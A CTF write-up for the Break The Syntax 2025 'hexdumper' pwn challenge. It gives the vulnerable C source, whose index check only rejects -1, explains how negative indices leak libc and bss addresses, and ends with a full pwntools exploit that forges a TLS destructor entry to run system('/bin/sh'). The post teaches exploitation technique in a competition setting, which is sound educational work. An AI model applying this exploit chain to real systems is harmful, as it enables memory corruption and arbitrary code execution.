---
title: "Break The Syntax 2025- hexdumper"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/BTS2025/BTS2025-logo.png
ribbon: green
description: "This challenge provides a data management service that parses your data using the CSV format."
categories:
  - CTF Writeups
  - pwn
---

> Challenge description:
>
> CSV is the best way to store data. Wanna prove me wrong?

```c
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>


#define MAX_DUMPS 0x41
#define MAX_DUMP_SIZE 0x4141

// Georgia 16 by Richard Sabey 8.2003
char logo[] = \
"____    ____                         ________                                                      \n"
"`MM'    `MM'                         `MMMMMMMb.                                                    \n"
" MM      MM                           MM    `Mb                                                    \n"
" MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ \n"
" MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM \n"
" MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   \n"
" MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    \n"
" MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     \n"
" MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     \n"
" MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     \n"
"_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    \n"
"                                                                          MM                       \n"
"                                                                          MM                       \n"
"                                                                         _MM_                      \n";

size_t no_dumps = 0;
void *dumps[MAX_DUMPS];
size_t dump_sizes[MAX_DUMPS];

void make_me_a_ctf_challenge(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void menu(void) {
    puts("=========== DUMP MENU ===========");
    puts("1) Create a new dump");
    puts("2) Hexdump a dump");
    puts("3) Bite a byte");
    puts("4) Merge two dumps");
    puts("5) Resize dump");
    puts("6) Remove dump");
    puts("7) Dump all dumps");
    puts("8) Dump the dump menu");
    puts("0) Coredump");
}

void create_dump(void) {
    if (no_dumps >= MAX_DUMPS) {
        puts("\tExceeded maximum dump limit!");
        return;
    }

    size_t dump_size = 0;
    printf("\tDump size: ");
    scanf("%lu", &dump_size);
    if (dump_size > MAX_DUMP_SIZE) {
        printf("\tYour dump is too big! %lu > %lu\n",
               dump_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }

    void *dump = malloc(dump_size);
    if (dump == NULL) {
        puts("Something went very wrong, contact admins");
        exit(-1);
    }
    memset(dump, 0, dump_size);
    
    size_t free_dump_idx = 0;
    while (dumps[free_dump_idx] != NULL) ++free_dump_idx;
    dumps[free_dump_idx] = dump;
    dump_sizes[free_dump_idx] = dump_size;
    ++no_dumps;

    printf("\tSuccessfully created a dump at index %lu\n", free_dump_idx);
}

int ask_for_index(void) {
    int idx = -1;

    printf("\tDump index: ");
    scanf("%d", &idx);
    if (idx >= MAX_DUMPS) {
        puts("\tIndex is too big");
        return -1;
    }

    return idx;
}

void hexdump_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;

    char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    puts("");
    puts("          0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f");
    puts("     +--------------------------------------------------");
    for (size_t i = 0; i < len; ++i) {
        if (i % 16 == 0) {
            // Avoid newline for first line
            if (i != 0)
                putchar('\n');
            printf("%04lx |  ", i);
        }
        printf(" %02hhX", dump[i]);
    }
    putchar('\n');
}

void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    unsigned char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }

    printf("\tValue in decimal: ");
    unsigned char byte = 0;
    scanf("%hhu", &byte);
    dump[offset] = byte;
    printf("\tByte at offset %lu changed successfully\n", offset);
}

void merge_dumps(void) {
    int idx1 = ask_for_index();
    if (idx1 == -1)
        return;
    if (dumps[idx1] == NULL) {
        printf("\tDump with index %d doesn't exist\t", idx1);
        return;
    }
    
    int idx2 = ask_for_index();
    if (idx2 == -1)
        return;
    if (dumps[idx2] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx2);
        return;
    }

    if (idx1 == idx2) {
        puts("\tCan't merge a dump with itself");
        return;
    }

    size_t len1 = dump_sizes[idx1];
    size_t len2 = dump_sizes[idx2];
    size_t new_len = len1 + len2;
    if (new_len > MAX_DUMP_SIZE) {
        printf("\tMerged size is too big! %lu > %lu\n",
               new_len,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    dumps[idx1] = realloc(dumps[idx1], len1+len2);
    dump_sizes[idx1] = new_len;

    // Code from: https://en.wikipedia.org/wiki/Duff%27s_device
    register unsigned char *to = dumps[idx1]+len1, *from = dumps[idx2];
    register int count = len2;
    {
        register int n = (count + 7) / 8;
        switch (count % 8) {
        case 0: do { *to++ = *from++;
        case 7:      *to++ = *from++;
        case 6:      *to++ = *from++;
        case 5:      *to++ = *from++;
        case 4:      *to++ = *from++;
        case 3:      *to++ = *from++;
        case 2:      *to++ = *from++;
        case 1:      *to++ = *from++;
                } while (--n > 0);
        }
    }

    free(dumps[idx2]);
    dumps[idx2] = NULL;
    dump_sizes[idx2] = 0;
    --no_dumps;
    
    puts("\tMerge successful");
}

void resize_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }

    printf("\tNew size: ");
    size_t new_size = 0;
    scanf("%lu", &new_size);
    if (new_size > MAX_DUMP_SIZE) {
        printf("\tNew size is too big! %lu > %lu\n",
               new_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    
    size_t old_size = dump_sizes[idx];
    if (old_size < new_size) {
        dumps[idx] = realloc(dumps[idx], new_size);

        // Zero out the new memory
        size_t no_new_bytes = new_size - old_size;
        memset(dumps[idx]+old_size, 0, no_new_bytes);
    }
    
    dump_sizes[idx] = new_size;
    puts("\tResize successful");
}

void remove_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tNo dump at index %d\n", idx);
        return;
    }

    free(dumps[idx]);
    dumps[idx] = NULL;
    dump_sizes[idx] = 0;
    --no_dumps;
    printf("\tDump at index %d removed successfully\n", idx);
}

void list_dumps(void) {
    for (int i = 0; i < MAX_DUMPS; ++i) {
        void *dump = dumps[i];
        size_t len = dump_sizes[i];
        if (dump == NULL)
            continue;
        printf("%02d: size=%lu\n", i, len);
    }
}

int main() {
    make_me_a_ctf_challenge();
    printf("%s", logo);

    menu();
    for (;;) {
        putchar('\n');
        // Remember to always check the return value of stdio.h functions kids!
        // Stay safe!
        if (printf("==> ") < 0) {
            printf("error while printing !!\n");
            exit(-1);
        }
        int option = 0;
        scanf("%d", &option);
        switch (option) {
            case 1:
                create_dump();
                break;
            case 2:
                hexdump_dump();
                break;
            case 3:
                change_byte();
                break;
            case 4:
                merge_dumps();
                break;
            case 5:
                resize_dump();
                break;
            case 6:
                remove_dump();
                break;
            case 7:
                list_dumps();
                break;
            case 8:
            default:
                menu();
                break;
            case 0:
                exit(0);
        }
    }
}
```

This challenge provide with that protections:
```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

So this challenge implements a simple memory dump manager with a menu-based interface. 
Users can create up to 0x41 (65) memory dumps, each up to 0x4141 (16705) bytes in size, stored in a dumps array. 
The program allows creating dumps (zero-initialized), viewing them as hex (like hexdump), modifying individual bytes, 
merging two dumps using Duff's device (a loop-unrolling optimization), resizing dumps (with zeroing of newly added memory), 
removing dumps, and listing all existing dumps. 

Ok, so the first bug we can find in it is this condition:
```c
// func 1
void hexdump_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
...

// func 2
void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
...

// func 3
void resize_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
...

// func 4
void remove_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
...
```

This condition block only the index `-1` but what about the other indexes less then `-1` e.g. `-80`?
so lets see how can we use this to leak memory addresses.

I chose this function try get some leaks:
```c
void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    unsigned char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }

    printf("\tValue in decimal: ");
    unsigned char byte = 0;
    scanf("%hhu", &byte);
    dump[offset] = byte;
    printf("\tByte at offset %lu changed successfully\n", offset);
}
```

as you can see this function ask for an index of the dump then check if the value in that index is valid and after that ask for an offset of the byte we want to edit and then check if the offset is higher then the dumo size that stored relative to the dump address and if the ofsset bigger then the dump size it print them both,
so the idea is to send negetive offset that its relative size is a address that we want to leak and then send the higher offset we can send so the function will print the that address.

```txt
____    ____                         ________                                                      
`MM'    `MM'                         `MMMMMMMb.                                                    
 MM      MM                           MM    `Mb                                                    
 MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ 
 MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM 
 MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   
 MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    
 MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     
 MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     
 MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     
_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    
                                                                          MM                       
                                                                          MM                       
                                                                         _MM_                      
=========== DUMP MENU ===========
1) Create a new dump
2) Hexdump a dump
3) Bite a byte
4) Merge two dumps
5) Resize dump
6) Remove dump
7) Dump all dumps
8) Dump the dump menu
0) Coredump

==> 3
	Dump index: -80
	Offset: 9999999999999999999999999                                
	Offset is bigger than dump size. 18446744073709551615 >= 140737353750400

==>
```

as you can see the program prints some value that was stored relative to index `-80`,
now lets check wich address space that address is belong to:
![libc leak](/assets/images/ctf-writeups/BTS2025/libc-leak.png)

and it points to:

![leak symbol](/assets/images/ctf-writeups/BTS2025/leak-symbol.png)

So we can see that this is a libc address that points to the `_IO_2_1_stdout_` object.
now lets write that in our pwntools exploit:
```py
def leak_libc(p: process):
    send_option(p, "3")
    p.sendline("-80") 
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    libc = int(p.recvline()[:-1]) - 0x21b780 # offset of _IO_2_1_stdout_
    print("libc: ", hex(libc))
    return libc
```

Our next goal is to find a way to arbitrary read / write, 
so for that we need to leak PIE addres / find negetive index 
that can overwrite dump blocks addresses then we could edit each address content that we want.

so for that i found that dump size of the dump index number `-259` contains its own address (loop pointer) 
and we can leak it / overwrite its first byte and make it point to any PIE address we want!

This is the function that leaks that index:
```py
def leak_bss(p: process):
    send_option(p, "3")
    p.sendline("-259") #offset of
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    bss = int(p.recvline()[:-1])
    print("bss: ", hex(bss))
    return bss
```

Now we got two leaks and the ability to do an arbitrary write both for libc and PIE addresses, so lets write the arbitrary write function.
```py
def arbitrary_write(p: process, addr: int, data: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)

    idx -= 1
    for b in range(8):
        change_byte(p, idx, b, (data >> (b * 8)) & 0xff)
```
This function edit the the address that our bss leak point to and then overwrite the content that this address point to.

And now we also able to use that address for arbitrary read, we may shoudl also use the `hexdump_dump` function to read and print the memory in the arbitrary address:
```py
def arbitrary_read(p: process, addr: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)
    p.sendline("2")
    p.sendline("-192")
    p.recvuntil("0000 |   ")
    line = b''.join(reversed(p.recvline()[:-1].split(b' ')))
    res = int(line, 16)
    return res
```

Now we have strong primitives to build our exploit, 
the glibc version is 2.35 so we cant overwrite malloc / realloc / free hooks, 
so i chose another cool technique that uses by overwrite the tls_call_dtors functions array 
that call that function before the program to exit.

so its goes like this:
1. leak pointer guard (relative to libc)
2. xor it with the target function we want to run (maybe the libc SYSTEM functin)
3. do ror encryption on the func value
4. write after the function the parameter we want to pass it (e.g. address of `/bin/sh`)
5. then overwrite the first object in the tls_call_dtors linked list
6. exit the program

Here is it in the pwntools code:
```py
    p_guard = arbitrary_read(p, libc - FS_BASE)
    print("p_guard: ", hex(p_guard))

    func = libc + SYSTEM
    func ^= p_guard
    func = rol(func, 0x11, word_size=64)

    arbitrary_write(p, bss + 0x20, func)
    arbitrary_write(p, bss + 0x28, libc + BINSH)
```

And here is the full exploit code of that challenge:
```py
from pwn import *

#offsets
__MALLOC_HOOK = 0x2214a0
ONE_GADGET =  0xebd43
__EXIT_FUNCS = 0x21a838
ENVIRON = 0x0000000000222200
MAIN_RET_ADDR = 0x20958
FS_BASE = 0x2890
__GI___call_tls_dtors = 0x2918
SYSTEM = 0x0000000000050d70
BINSH = 0x1d8678

def send_option(p: process, option: str):
    p.sendlineafter("==> ", option)

def change_byte(p: process, idx: int, offset: int, new_byte: int):
    p.sendline("3")
    p.sendline(str(idx))
    p.sendline(str(offset))
    p.sendline(str(new_byte))
    print("change_byte: ", idx, offset, hex(new_byte))

def leak_libc(p: process):
    send_option(p, "3")
    p.sendline("-80") #offset of _IO_2_1_stdout_
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    libc = int(p.recvline()[:-1]) - 0x21b780
    print("libc: ", hex(libc))
    return libc

def leak_bss(p: process):
    send_option(p, "3")
    p.sendline("-259") #offset of
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    bss = int(p.recvline()[:-1])
    print("bss: ", hex(bss))
    return bss

def arbitrary_write(p: process, addr: int, data: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)

    idx -= 1
    for b in range(8):
        change_byte(p, idx, b, (data >> (b * 8)) & 0xff)

def arbitrary_read(p: process, addr: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)
    p.sendline("2")
    p.sendline("-192")
    p.recvuntil("0000 |   ")
    line = b''.join(reversed(p.recvline()[:-1].split(b' ')))
    res = int(line, 16)
    return res

def leak_stack(p: process, libc: int):
    stack = arbitrary_read(p, libc + ENVIRON) - 0x20a78
    print("stack: ", hex(stack))
    return stack

def generate_dtor_struct(p: process, param: int, addr: int):
    return p64(addr) + p64(param)

def main():
    ### run ###
    p = process("/tmp/h")

    ### leaks ###
    libc = leak_libc(p)
    bss = leak_bss(p)

    ### setup ###
    idx = -191
    change_byte(p, idx, 0, (bss & 0xff) - 8) # set arb arg addr
    arbitrary_write(p, bss + (0x44 * 8) - 8, 8) # set arb arg size to 8

    ### leaks ###
    stack = leak_stack(p, libc)
    p_guard = arbitrary_read(p, libc - FS_BASE)
    print("p_guard: ", hex(p_guard))

    ### payload ###
    func = libc + SYSTEM
    func ^= p_guard
    func = rol(func, 0x11, word_size=64)

    arbitrary_write(p, bss + 0x20, func)
    arbitrary_write(p, bss + 0x28, libc + BINSH)
    for i in range(1,3):
        arbitrary_write(p, bss + 0x28 + (i * 8), 0)
    arbitrary_write(p, libc - __GI___call_tls_dtors, bss + 0x20)
    p.sendline("0")
    p.interactive()


if __name__ == "__main__":
    main()
```
